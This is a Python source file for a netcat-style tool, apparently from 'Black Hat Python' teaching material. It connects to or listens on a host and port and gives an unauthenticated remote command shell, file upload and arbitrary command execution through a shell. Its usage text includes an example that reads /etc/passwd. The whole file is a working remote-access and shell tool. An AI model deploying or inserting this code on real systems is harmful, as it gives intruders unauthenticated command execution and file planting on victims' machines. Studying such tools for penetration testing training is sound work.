#!/usr/bin/env python3

import socket
import getopt
import sys
import threading
import subprocess

####################### some global variables ##########################

listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

########################################################################

def usage():
    print("BHP Net T00L")
    print("")
    print("usage: bhpnet.py -t target_host -p port")
    print("-l --listen               - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run  - execute the given file upon receiving a connection")
    print("-c --command              - initialize a command shell")
    print("-u --upload_destination   - upon receiving a connection upload a file and write to [destination]")
    print("\n\n")
    print("Examples:")
    print("bhp_net.py -t 192.168.87.23 -p 5555 -l -c")
    print("bhp_net.py -t 192.168.87.23 -p 5555 -l -u=c:\\target.exe")
    print("bhp_net.py -t 192.168.87.23 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'Alraj' | ./bhp_net.py -t 192.168.87.30 -p 135")
    sys.exit(0)

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload_destination"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        try:
            buffer = sys.stdin.read()
            client_sender(buffer)
        except KeyboardInterrupt:
            print("\n[*] Client interrupted. Exiting.")
            sys.exit(0)


    if listen:
        try:
            server_loop()
        except KeyboardInterrupt:
            print("\n[*] Server interrupted. Exiting gracefully.")
            sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode())                                                                                                                                                                                                        
        while True:
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096).decode()
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(response, end='')

            buffer = input("")
            buffer += "\n"
            client.send(buffer.encode())

    except Exception as e:
        print(f"[*] Exception: {e}. Exiting.")                
        client.close()

def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = b"Failed to execute command \r\n"

    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = b""

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)

            client_socket.send(f"Successfully saved file to {upload_destination} \r\n".encode())
        except:
            client_socket.send(f"Failed to save file to {upload_destination} \r\n".encode())

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send(b"<BHP:#> ")
            cmd_buffer = ""

            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()

            response = run_command(cmd_buffer)
            client_socket.send(response)

main()
